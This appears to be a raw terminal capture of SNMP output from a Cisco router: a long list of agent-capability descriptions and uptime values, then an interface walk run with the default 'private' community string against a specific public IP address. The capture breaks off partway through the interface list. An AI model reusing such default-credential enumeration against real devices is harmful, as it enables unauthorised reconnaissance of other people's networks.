+ciscoFrasHostCapabilityV11R03 AGENT-CAPABILITIES
+SUPPORTS CISCO-FRAS-HOST-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.33 = STRING: Agent capabilities for CISCO-GATEKEEPER-MIB
+ LAST-UPDATED 200004170000Z
+ciscoGatekeeperCapabilityV12R01 AGENT-CAPABILITIES
+SUPPORTS CISCO-GATEKEEPER-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.34 = STRING: Agent capabilities for CISCO-GPRS-GTP-MIB
+ LAST-UPDATED 200112201600Z
+cgprsGtpCapabilityV12R02 AGENT-CAPABILITIES
+ SUPPORTS CISCO-GPRS-GTP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.35 = STRING: Agent capabilities for HOST-RESOURCES-MIB
+ LAST-UPDATED 200709170000Z
+ciscoHostResourcesCapabilityV12R04 AGENT-CAPABILITIES
+ SUPPORTS HOST-RESOURCES-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.36 = STRING: Agent capabilities for CISCO-HSRP-MIB
+ LAST-UPDATED 9808250000Z
+ciscoHsrpCapabilityV12R0 AGENT-CAPABILITIES
+SUPPORTS CISCO-HSRP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.37 = STRING: Agent capabilities for CISCO-HSRP-EXT-MIB
+ LAST-UPDATED 9808250000Z
+ciscoHsrpExtCapabilityV12R0 AGENT-CAPABILITIES
+SUPPORTS CISCO-HSRP-EXT-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.38 = STRING: Integrated CSU/DSU MIB module.  For T1 and Switched 56 kbps
+                        interfaces.
+ LAST-UPDATED 9601210000Z
+ciscoICsuDsuCapabilityV11R01 AGENT-CAPABILITIES
+SUPPORTS CISCO-ICSUDSU-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.39 = STRING: Agent capabilities for DIAL-CONTROL-MIB
+ LAST-UPDATED 9709170000Z
+ciscoIetfDialControlCapabilityV11R03 AGENT-CAPABILITIES
+SUPPORTS CISCO-IETF-DIAL-CONTROL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.40 = STRING: Agent capabilities for DLSW-MIB
+ LAST-UPDATED 9702280000Z
+ciscoIetfDlswCapabilityV11R00 AGENT-CAPABILITIES
+SUPPORTS DLSW-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.41 = STRING: Agent capabilities for ISDN-MIB (IETF RFC2127)
+ LAST-UPDATED 9806210000Z
+ciscoIetfIsdnCapabilityV11R03 AGENT-CAPABILITIES
+SUPPORTS CISCO-IETF-ISDN-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.42 = STRING: Agent capabilities for NAT-MIB
+ LAST-UPDATED 200109100000Z
+ciscoIetfNatCapabilityV12R02T AGENT-CAPABILITIES
+SUPPORTS CISCO-IETF-NAT-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.43 = STRING: Agent capabilities for TCP-MIB
+ LAST-UPDATED 9611270000Z
+ciscoIetfTcpCapabilityV11R02 AGENT-CAPABILITIES
+SUPPORTS TCP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.44 = STRING: Modification of linkDown trap objects
+                 and ifLastChange object
+ LAST-UPDATED 200301210000Z
+ciscoIfCapabilityFrsm12V3R00 AGENT-CAPABILITIES
+SUPPORTS IF-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.45 = STRING: 200611240000Z
+    DESCRIPTION
+
+
+ LAST-UPDATED 200611240000Z
+ciscoImaExtAxsmeCapabilityV5R320 AGENT-CAPABILITIES
+ SUPPORTS CISCO-IMA-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.46 = STRING: Agent capabilities for CISCO-IMAGE-MIB
+ LAST-UPDATED 9501250000Z
+ciscoImageMIBCapabilityV10R01 AGENT-CAPABILITIES
+SUPPORTS CISCO-IMAGE-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.47 = STRING: Agent capabilities for CISCO-IPSLA-VIDEO-PROFILE-MIB
+ LAST-UPDATED 201106010000Z
+ciscoIpslaVideoProfileCapabilityV152R02T AGENT-CAPABILITIES
+ SUPPORTS CISCO-IPSLA-VIDEO-PROFILE-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.48 = STRING: Agent capabilities for CISCO-ISDN-MIB
+ LAST-UPDATED 9503100000Z
+ciscoIsdnCapabilityV10R03 AGENT-CAPABILITIES
+SUPPORTS CISCO-ISDN-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.49 = STRING: Agent capabilities for Job-Monitoring-MIB
+ LAST-UPDATED 200706070000Z
+ciscoJobMonitoringCapabilityV12R04 AGENT-CAPABILITIES
+ SUPPORTS Job-Monitoring-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.50 = STRING: Agent capabilities for CISCO-MEDIA-QUALITY-MIB.
+ LAST-UPDATED 201109230000Z
+ciscoMediaQualityCapabilityV152R02 AGENT-CAPABILITIES
+ SUPPORTS CISCO-MEDIA-QUALITY-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.51 = STRING: Agent capabilities for MIP-MIB
+                        (MobileIP MIB).
+ LAST-UPDATED 200312240000Z
+ciscoMIPCapabilityV12R0304T AGENT-CAPABILITIES
+SUPPORTS MIP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.52 = STRING: Agent capabilities for CISCO-MMAIL-DIAL-CONTROL-MIB
+ LAST-UPDATED 9806010000Z
+ciscoMediaMailControlCapabilityV12R00 AGENT-CAPABILITIES
+SUPPORTS CISCO-MMAIL-DIAL-CONTROL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.53 = STRING: 200607310000Z
+    DESCRIPTION
+
+
+ LAST-UPDATED 200607310000Z
+ciscoModemMgmtCapV12R4TISR AGENT-CAPABILITIES
+ SUPPORTS CISCO-MODEM-MGMT-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.54 = STRING: Agent capabilities for MSDP-MIB
+ LAST-UPDATED 200008220000Z
+ciscoMsdpCapabilityV12R01T AGENT-CAPABILITIES
+SUPPORTS DRAFT-MSDP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.55 = STRING: The capabilities description of CISCO-NAC-NAD-MIB.
+
+
+        REVISION
+ LAST-UPDATED 200612120000Z
+ciscoNacNadCapIOSV12R04012T AGENT-CAPABILITIES
+ SUPPORTS CISCO-NAC-NAD-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.56 = STRING: Agent capabilities for NOTIFICATION-LOG-MIB
+ LAST-UPDATED 200511180000Z
+cNotificationLogCapabilityV12R04 AGENT-CAPABILITIES
+ SUPPORTS NOTIFICATION-LOG-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.57 = STRING: Agent capabilities for NOVELL-IPX-MIB
+ LAST-UPDATED 9408180000Z
+ciscoNovellIpxCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS NOVELL-IPX-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.58 = STRING: Agent capabilities for NOVELL-RIPSAP-MIB
+ LAST-UPDATED 9408180000Z
+ciscoNovellRipSapCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS NOVELL-RIPSAP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.59 = STRING: Agent capabilities for CISCO-PING-MIB
+ LAST-UPDATED 9408180000Z
+ciscoPingCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS CISCO-PING-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.60 = STRING: Agent capabilities for CISCO-POP-MGMT-MIB.
+ LAST-UPDATED 200510120000Z
+ciscoPopMgmtCapabilityV12R04 AGENT-CAPABILITIES
+SUPPORTS CISCO-POP-MGMT-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.61 = STRING: Agent capabilities for Printer-MIB
+ LAST-UPDATED 200706070000Z
+ciscoPrinterCapabilityV12R04 AGENT-CAPABILITIES
+ SUPPORTS Printer-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.62 = STRING: Agent capabilities for CISCO-PROCESS-MIB
+ LAST-UPDATED 200411050000Z
+ciscoProcessCapabilityV12R03T AGENT-CAPABILITIES
+SUPPORTS CISCO-PROCESS-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.63 = STRING: Agent capabilities for the RFC1213-MIB (MIB-II)
+ LAST-UPDATED 200109081600Z
+ciscoRFC1213CapabilityV12R02 AGENT-CAPABILITIES
+SUPPORTS RFC1213-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.64 = STRING: Agent capabilities for RFC1231-MIB (Token Ring MIB)
+ LAST-UPDATED 9408180000Z
+ciscoRFC1231CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RFC1231-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.65 = STRING: Agent capabilities for RFC1243-MIB (Appletalk MIB)
+ LAST-UPDATED 9408180000Z
+ciscoRFC1243CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RFC1243-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.66 = STRING: Agent capabilities for the OSPF MIB.
+ LAST-UPDATED 9411220000Z
+ospfCapabilityV10R01 AGENT-CAPABILITIES
+SUPPORTS RFC1253-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.67 = STRING: Agent capabilities for RFC1285-MIB (FDDI MIB)
+ LAST-UPDATED 9408180000Z
+ciscoRFC1285CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RFC1285-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.68 = STRING: Agent capabilities for RFC1315-MIB (Frame Relay MIB)
+ LAST-UPDATED 9408180000Z
+ciscoRFC1315CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RFC1315-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.69 = STRING: Agent capabilities for RFC1381-MIB
+ LAST-UPDATED 9408180000Z
+ciscoRFC1381CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RFC1381-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.70 = STRING: Agent capabilities for RFC1382-MIB (X.25 MIB)
+ LAST-UPDATED 9408180000Z
+ciscoRFC1382CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RFC1382-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.71 = STRING: Agent capabilities for RFC1398-MIB (Ethernet MIB).
+ LAST-UPDATED 9408180000Z
+ciscoRFC1398CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RFC1398-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.72 = STRING: Agent capabilities for RFC1406-MIB (DS1 MIB)
+ LAST-UPDATED 200307080000Z
+ciscoRFC1406CapabilityV122R12T AGENT-CAPABILITIES
+SUPPORTS RFC1406-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.73 = STRING: Agent capabilities for RFC1407-MIB (DS3 MIB)
+ LAST-UPDATED 200108170000Z
+ciscoRFC1407CapabilityV122R12 AGENT-CAPABILITIES
+SUPPORTS RFC1407-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.74 = STRING: Agent capabilities for RFC1595-MIB (SONET MIB)
+ LAST-UPDATED 9607290000Z
+ciscoRFC1595CapabilityV11R01 AGENT-CAPABILITIES
+SUPPORTS RFC1595-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.75 = STRING: Agent capabilities for RS-232-MIB
+ LAST-UPDATED 9408180000Z
+ciscoRS232CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS RS-232-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.76 = STRING: Agent capabilities for the CISCO-SIP-UA-MIB.
+ LAST-UPDATED 200506220000Z
+ciscoSipUaCapabilityV12R0402T AGENT-CAPABILITIES
+SUPPORTS CISCO-SIP-UA-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.77 = STRING: Agent capabilities for the CISCO-SNA-LLC-MIB
+ LAST-UPDATED 9505100000Z
+ciscoSnaLlcCapabilityV11R00 AGENT-CAPABILITIES
+SUPPORTS CISCO-SNA-LLC-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.78 = STRING: Agent capabilities for the SNA-SDLC-MIB
+ LAST-UPDATED 9501230000Z
+ciscoSnaSdlcCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS SNA-SDLC-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.79 = STRING: Agent capabilities for CISCO-SNAPSHOT-MIB
+ LAST-UPDATED 9501230000Z
+ciscoSnapshotCapabilityV10R03 AGENT-CAPABILITIES
+SUPPORTS CISCO-SNAPSHOT-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.80 = STRING: Agent capabilities for SNMPv2-MIB
+ LAST-UPDATED 9408180000Z
+ciscoSnmpV2CapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS SNMPv2-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.81 = STRING: Agent capabilities for SNMPv2-PARTY-MIB
+ LAST-UPDATED 9408180000Z
+ciscoSnmpV2PartyCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS SNMPv2-PARTY-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.82 = STRING: Agent capabilities for SOURCE-ROUTING-MIB
+ LAST-UPDATED 9408180000Z
+ciscoSourceRoutingCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS SOURCE-ROUTING-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.83 = STRING: Agent capabilities for CISCO-TCP-MIB
+ LAST-UPDATED 9408180000Z
+ciscoTcpCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS CISCO-TCP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.84 = STRING: Agent capabilities for the CISCO-TCPOFFLOAD-MIB
+ LAST-UPDATED 9706230000Z
+ciscoTcpOffloadCapabilityV11R02 AGENT-CAPABILITIES
+SUPPORTS CISCO-TCPOFFLOAD-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.85 = STRING: Agent capabilities for
+                 CISCO-THREAT-MITIGATION-SERVICE-MIB.
+ LAST-UPDATED 200705170000Z
+ciscoTmsCapIOSV12R05T AGENT-CAPABILITIES
+ SUPPORTS CISCO-THREAT-MITIGATION-SERVICE-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.86 = STRING: Agent capabilities for UDP-MIB
+ LAST-UPDATED 9611270000Z
+ciscoUdpCapabilityV11R02 AGENT-CAPABILITIES
+SUPPORTS UDP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.87 = STRING: Agent capabilities for CISCO-VIDEO-SESSION-MIB.
+ LAST-UPDATED 201105240000Z
+ciscoVideoSessionCapabilityV15R01 AGENT-CAPABILITIES
+ SUPPORTS CISCO-VIDEO-SESSION-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.88 = STRING: Agent capabilities for CISCO-VOICE-ANALOG-IF-MIB
+
+
+        REVISION
+ LAST-UPDATED 200304280000Z
+ciscoVoiceAnalogIfCapabilityV11R03 AGENT-CAPABILITIES
+SUPPORTS CISCO-VOICE-ANALOG-IF-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.89 = STRING: Agent capabilities for CISCO-VOICE-DIAL-CONTROL-MIB.
+ LAST-UPDATED 200903310000Z
+ciscoVoiceDialControlCapV12R04 AGENT-CAPABILITIES
+ SUPPORTS CISCO-VOICE-DIAL-CONTROL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.90 = STRING: Agent capabilities for CISCO-VOICE-IF-MIB
+ LAST-UPDATED 9706150000Z
+ciscoVoiceIfCapabilityV11R03 AGENT-CAPABILITIES
+SUPPORTS CISCO-VOICE-IF-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.91 = STRING:
+ LAST-UPDATED 200603010000Z
+ciscoXgcpCapabilityV5R300 AGENT-CAPABILITIES
+ SUPPORTS CISCO-XGCP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.92 = STRING: The capabilities description of
+                 CISCO-XGCP-EXT-MIB.
+ LAST-UPDATED 200406180000Z
+ciscoXgcpExtCapabilityV12R03 AGENT-CAPABILITIES
+ SUPPORTS CISCO-XGCP-EXT-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.93 = STRING: Agent capabilities for MPLS-TE-MIB
+
+
+   -- Revision history.
+
+
+
+   REVISION
+
+
+ LAST-UPDATED
+mplsTeCapabilityV10R00 AGENT-CAPABILITIES
+SUPPORTS MPLS-TE-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.94 = STRING: Agent capabilities for OLD-CISCO-APPLETALK-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoAppletalkCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-APPLETALK-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.95 = STRING: Agent capabilities for OLD-CISCO-CHASSIS-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoChassisCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-CHASSIS-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.96 = STRING: Agent capabilities for OLD-CISCO-CPU-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoCpuCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-CPU-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.97 = STRING: Agent capabilities for OLD-CISCO-DECNET-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoDECnetCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-DECNET-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.98 = STRING: Agent capabilities for OLD-CISCO-ENV-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoEnvCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-ENV-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.99 = STRING: Agent capabilities for OLD-CISCO-FLASH-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoFlashCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-FLASH-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.100 = STRING: Agent capabilities for OLD-CISCO-INTERFACES-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoIfCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-INTERFACES-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.101 = STRING: Agent capabilities for OLD-CISCO-IP-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoIpCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-IP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.102 = STRING: Agent capabilities for OLD-CISCO-MEMORY-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoMemoryCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-MEMORY-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.103 = STRING: Agent capabilities for OLD-CISCO-NOVELL-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoNovellCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-NOVELL-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.104 = STRING: Agent capabilities for OLD-CISCO-SYSTEM-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoSystemCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-SYSTEM-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.105 = STRING: Agent capabilities for OLD-CISCO-TCP-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoTcpCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-TCP-MIB
+File name: sys
+SNMPv2-MIB::sysORDescr.106 = STRING: Agent capabilities for OLD-CISCO-TS-MIB
+ LAST-UPDATED 9408180000Z
+oldCiscoTsCapabilityV10R02 AGENT-CAPABILITIES
+SUPPORTS OLD-CISCO-TS-MIB
+File name: sys
+SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.8 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.9 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.10 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.11 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.12 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.13 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.14 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.15 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.16 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.17 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.18 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.19 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.20 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.21 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.22 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.23 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.24 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.25 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.26 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.27 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.28 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.29 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.30 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.31 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.32 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.33 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.34 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.35 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.36 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.37 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.38 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.39 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.40 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.41 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.42 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.43 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.44 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.45 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.46 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.47 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.48 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.49 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.50 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.51 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.52 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.53 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.54 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.55 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.56 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.57 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.58 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.59 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.60 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.61 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.62 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.63 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.64 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.65 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.66 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.67 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.68 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.69 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.70 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.71 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.72 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.73 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.74 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.75 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.76 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.77 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.78 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.79 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.80 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.81 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.82 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.83 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.84 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.85 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.86 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.87 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.88 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.89 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.90 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.91 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.92 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.93 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.94 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.95 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.96 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.97 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.98 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.99 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.100 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.101 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.102 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.103 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.104 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.105 = Timeticks: (0) 0:00:00.00
+SNMPv2-MIB::sysORUpTime.106 = Timeticks: (0) 0:00:00.00
+~ $ snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.2.1.2
+IF-MIB::ifNumber.0 = INTEGER: 11
+IF-MIB::ifIndex.1 = INTEGER: 1
+IF-MIB::ifIndex.2 = INTEGER: 2
+IF-MIB::ifIndex.3 = INTEGER: 3
+IF-MIB::ifIndex.4 = INTEGER: 4
+IF-MIB::ifIndex.5 = INTEGER: 5
+IF-MIB::ifIndex.6 = INTEGER: 6
+IF-MIB::ifIndex.7 = INTEGER: 7
+IF-MIB::ifIndex.8 = INTEGER: 8
+IF-MIB::ifIndex.9 = INTEGER: 9
+IF-MIB::ifIndex.10 = INTEGER: 10
+IF-MIB::ifIndex.11 = INTEGER: 11
+IF-MIB::ifDescr.1 = STRING: GigabitEthernet0/0/0
+IF-MIB::ifDescr.2 = STRING: GigabitEthernet0/1/0
+IF-MIB::ifDescr.3 = STRING: Embedded-Service-Engine0/0
+IF-MIB::ifDescr.4 = STRING: GigabitEthernet0/0
+IF-MIB::ifDescr.5 = STRING: GigabitEthernet0/1
+IF-MIB::ifDescr.6 = STRING: Backplane-GigabitEthernet0/3
